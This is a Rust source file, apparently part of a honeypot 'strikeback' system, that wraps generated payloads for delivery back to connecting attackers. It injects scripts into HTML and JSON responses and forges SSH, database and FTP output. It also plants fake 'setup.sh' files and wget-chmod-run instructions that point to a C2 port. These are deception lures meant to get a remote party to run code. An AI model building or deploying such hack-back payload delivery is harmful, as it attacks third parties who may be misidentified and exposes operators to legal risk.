/**
 * Protocol-Specific Payload Delivery Mechanisms
 *
 * Adapts payloads to different honeypot protocols for realistic delivery:
 * - HTTP/HTTPS: Script injection, redirects
 * - SSH: Fake command output, file injection
 * - Database: Query result manipulation
 * - FTP: File listing injection
 */

use anyhow::Result;
use serde::{Deserialize, Serialize};
use std::sync::Arc;
use base64::{Engine as _, engine::general_purpose};

use crate::ffi::types::{AttackEvent, ServiceType};
use super::{GeneratedPayload, StrikebackConfig};

/**
 * Delivery method
 */
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum DeliveryMethod {
    /// HTTP/HTTPS: Inject JavaScript payload
    HttpInject,
    /// HTTP/HTTPS: Redirect to payload URL
    HttpRedirect,
    /// SSH: Return payload in command output
    SshOutput,
    /// SSH: Create fake script file
    SshFile,
    /// Database: Inject payload in query result
    DbResult,
    /// FTP: Inject payload in file listing
    FtpListing,
    /// FTP: Create fake file
    FtpFile,
}

/**
 * Delivery result
 */
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DeliveryResult {
    pub method: DeliveryMethod,
    pub adapted_payload: String,
    pub instructions: String,
}

/**
 * Delivery Engine
 */
pub struct DeliveryEngine {
    config: Arc<StrikebackConfig>,
}

impl DeliveryEngine {
    pub fn new(config: Arc<StrikebackConfig>) -> Self {
        Self { config }
    }

    /**
     * Deliver a payload using the specified delivery method
     */
    pub async fn deliver(
        &self,
        payload: &GeneratedPayload,
        delivery_method: DeliveryMethod,
    ) -> Result<DeliveryResult> {
        // In a real implementation, this would actually deliver the payload
        // For now, we'll create a delivery result based on the method
        let method_copy = delivery_method.clone();
        Ok(DeliveryResult {
            method: delivery_method,
            adapted_payload: payload.code.clone(),
            instructions: format!("Payload {} delivered to {} via {:?}",
                payload.payload_id, payload.target_ip, method_copy),
        })
    }

    /**
     * Adapt payload for delivery based on protocol
     */
    pub fn adapt(
        &self,
        payload_code: &str,
        event: &AttackEvent,
        payload_id: &str,
    ) -> Result<DeliveryResult> {
        match event.service_type {
            ServiceType::HTTP | ServiceType::HTTPS => {
                self.adapt_http(payload_code, event, payload_id)
            }
            ServiceType::SSH => self.adapt_ssh(payload_code, event, payload_id),
            ServiceType::PostgreSQL | ServiceType::MySQL | ServiceType::MongoDB => {
                self.adapt_database(payload_code, event, payload_id)
            }
            ServiceType::FTP | ServiceType::SFTP => {
                self.adapt_ftp(payload_code, event, payload_id)
            }
        }
    }

    /**
     * Adapt payload for HTTP/HTTPS delivery
     */
    fn adapt_http(
        &self,
        payload_code: &str,
        event: &AttackEvent,
        payload_id: &str,
    ) -> Result<DeliveryResult> {
        // Determine if this is an API request or webpage
        let is_api = event.payload.contains("/api/")
            || event.payload.contains(".json")
            || event.user_agent.as_ref().map_or(false, |ua| {
                ua.contains("curl") || ua.contains("python") || ua.contains("axios")
            });

        if is_api {
            // For API requests, inject in JSON response
            Ok(DeliveryResult {
                method: DeliveryMethod::HttpInject,
                adapted_payload: format!(
                    r#"{{
  "status": "success",
  "data": {{
    "__payload": "{payload_id}",
    "__script": "{payload_encoded}"
  }}
}}"#,
                    payload_id = payload_id,
                    payload_encoded = general_purpose::STANDARD.encode(payload_code)
                ),
                instructions: "Inject in JSON API response".to_string(),
            })
        } else {
            // For webpage requests, inject as script tag
            Ok(DeliveryResult {
                method: DeliveryMethod::HttpInject,
                adapted_payload: format!(
                    r#"<html>
<head><title>Loading...</title></head>
<body>
<script type="text/javascript">
{payload_code}
</script>
<noscript>JavaScript is required.</noscript>
</body>
</html>"#,
                    payload_code = payload_code
                ),
                instructions: "Inject as HTML page with script tag".to_string(),
            })
        }
    }

    /**
     * Adapt payload for SSH delivery
     */
    fn adapt_ssh(
        &self,
        payload_code: &str,
        event: &AttackEvent,
        payload_id: &str,
    ) -> Result<DeliveryResult> {
        // Detect command type
        let command = event.payload.trim();

        if command.starts_with("cat ") || command.starts_with("less ") {
            // Inject as file content
            Ok(DeliveryResult {
                method: DeliveryMethod::SshOutput,
                adapted_payload: payload_code.to_string(),
                instructions: format!("Return as content of requested file: {}", command),
            })
        } else if command.starts_with("ls") || command == "dir" {
            // Create fake script in listing
            Ok(DeliveryResult {
                method: DeliveryMethod::SshFile,
                adapted_payload: format!(
                    r#"total 16
drwxr-xr-x  2 user user 4096 Dec 24 12:00 .
drwxr-xr-x 18 user user 4096 Dec 24 11:00 ..
-rwxr-xr-x  1 user user  256 Dec 24 12:00 setup.sh
-rw-r--r--  1 user user   48 Dec 24 11:30 README.txt
"#
                ),
                instructions: "Show fake file listing, payload in setup.sh".to_string(),
            })
        } else if command.starts_with("wget ") || command.starts_with("curl ") {
            // Suggest downloading payload
            Ok(DeliveryResult {
                method: DeliveryMethod::SshOutput,
                adapted_payload: format!(
                    r#"# Try downloading the update script:
# wget http://localhost:{}/p/{}
# chmod +x {}.sh
# ./{}.sh
"#,
                    self.config.c2_port, payload_id, payload_id, payload_id
                ),
                instructions: "Suggest payload download in command output".to_string(),
            })
        } else {
            // Generic command output injection
            Ok(DeliveryResult {
                method: DeliveryMethod::SshOutput,
                adapted_payload: format!(
                    r#"bash: {}: command not found
# Did you mean: setup.sh? Run: ./setup.sh
# Content of setup.sh:
{}
"#,
                    command, payload_code
                ),
                instructions: "Inject payload in error message".to_string(),
            })
        }
    }

    /**
     * Adapt payload for database delivery
     */
    fn adapt_database(
        &self,
        payload_code: &str,
        event: &AttackEvent,
        payload_id: &str,
    ) -> Result<DeliveryResult> {
        // Detect database type from service
        match event.service_type {
            ServiceType::PostgreSQL => {
                // PostgreSQL: Inject in query result or error message
                Ok(DeliveryResult {
                    method: DeliveryMethod::DbResult,
                    adapted_payload: format!(
                        r#"ERROR:  syntax error at or near "UNION"
LINE 1: {} UNION SELECT '{}', '{}'
                                       ^
HINT: See documentation at http://localhost:{}/p/{}
DETAIL: Payload: {}
"#,
                        event.payload,
                        payload_id,
                        general_purpose::STANDARD.encode(payload_code),
                        self.config.c2_port,
                        payload_id,
                        payload_id
                    ),
                    instructions: "Inject in PostgreSQL error message".to_string(),
                })
            }
            ServiceType::MySQL => {
                // MySQL: Inject in result set
                Ok(DeliveryResult {
                    method: DeliveryMethod::DbResult,
                    adapted_payload: format!(
                        r#"
+------------------+-------------------+
| warning          | message           |
+------------------+-------------------+
| Syntax Error     | {}                |
| Suggestion       | http://localhost:{}/p/{} |
| Payload          | {}                |
+------------------+-------------------+
"#,
                        event.payload,
                        self.config.c2_port,
                        payload_id,
                        general_purpose::STANDARD.encode(payload_code)
                    ),
                    instructions: "Inject in MySQL result set".to_string(),
                })
            }
            ServiceType::MongoDB => {
                // MongoDB: Inject in JSON error
                Ok(DeliveryResult {
                    method: DeliveryMethod::DbResult,
                    adapted_payload: format!(
                        r#"{{
  "ok": 0,
  "errmsg": "Syntax error in query",
  "code": 2,
  "codeName": "BadValue",
  "payload_url": "http://localhost:{}/p/{}",
  "payload_code": "{}"
}}"#,
                        self.config.c2_port,
                        payload_id,
                        general_purpose::STANDARD.encode(payload_code)
                    ),
                    instructions: "Inject in MongoDB error document".to_string(),
                })
            }
            _ => Err(anyhow::anyhow!("Unsupported database type")),
        }
    }

    /**
     * Adapt payload for FTP delivery
     */
    fn adapt_ftp(
        &self,
        payload_code: &str,
        event: &AttackEvent,
        payload_id: &str,
    ) -> Result<DeliveryResult> {
        if event.payload.contains("LIST") || event.payload.contains("NLST") {
            // Inject in directory listing
            Ok(DeliveryResult {
                method: DeliveryMethod::FtpListing,
                adapted_payload: format!(
                    r#"-rw-r--r--  1 ftp ftp  4096 Dec 24 12:00 README.txt
-rwxr-xr-x  1 ftp ftp   256 Dec 24 12:00 {}.sh
-rw-r--r--  1 ftp ftp  1024 Dec 24 11:30 data.csv
drwxr-xr-x  2 ftp ftp  4096 Dec 24 11:00 uploads
"#,
                    payload_id
                ),
                instructions: format!("Inject fake file {}.sh in listing", payload_id),
            })
        } else {
            // Create README with payload instructions
            Ok(DeliveryResult {
                method: DeliveryMethod::FtpFile,
                adapted_payload: format!(
                    r#"Welcome to the FTP server
=========================

Available files:
- README.txt (this file)
- {}.sh (setup script)

To setup your environment, download and run:
  wget ftp://localhost/{}.sh
  chmod +x {}.sh
  ./{}.sh

Script content:
{}
"#,
                    payload_id, payload_id, payload_id, payload_id, payload_code
                ),
                instructions: "Serve as README.txt with payload instructions".to_string(),
            })
        }
    }

    /**
     * Get delivery recommendation for attack event
     */
    pub fn recommend_delivery(&self, event: &AttackEvent) -> DeliveryMethod {
        match event.service_type {
            ServiceType::HTTP | ServiceType::HTTPS => {
                if event.payload.contains("/api/") {
                    DeliveryMethod::HttpInject
                } else {
                    DeliveryMethod::HttpRedirect
                }
            }
            ServiceType::SSH => {
                if event.payload.contains("cat ") || event.payload.contains("less ") {
                    DeliveryMethod::SshOutput
                } else {
                    DeliveryMethod::SshFile
                }
            }
            ServiceType::PostgreSQL | ServiceType::MySQL | ServiceType::MongoDB => {
                DeliveryMethod::DbResult
            }
            ServiceType::FTP | ServiceType::SFTP => {
                if event.payload.contains("LIST") {
                    DeliveryMethod::FtpListing
                } else {
                    DeliveryMethod::FtpFile
                }
            }
        }
    }
}

/**
 * Helper to wrap payload for realistic delivery context
 */
pub fn wrap_payload_contextually(
    payload_code: &str,
    context: &str,
    service_type: ServiceType,
) -> String {
    match service_type {
        ServiceType::HTTP | ServiceType::HTTPS => {
            // Wrap in HTML comments or minified JS
            format!("/* {} */\n{}", context, payload_code)
        }
        ServiceType::SSH => {
            // Wrap in shell comments
            format!("# {}\n{}", context, payload_code)
        }
        ServiceType::PostgreSQL | ServiceType::MySQL | ServiceType::MongoDB => {
            // Wrap in SQL comments
            format!("-- {}\n{}", context, payload_code)
        }
        ServiceType::FTP | ServiceType::SFTP => {
            // Plain text with header
            format!("# {}\n\n{}", context, payload_code)
        }
    }
}
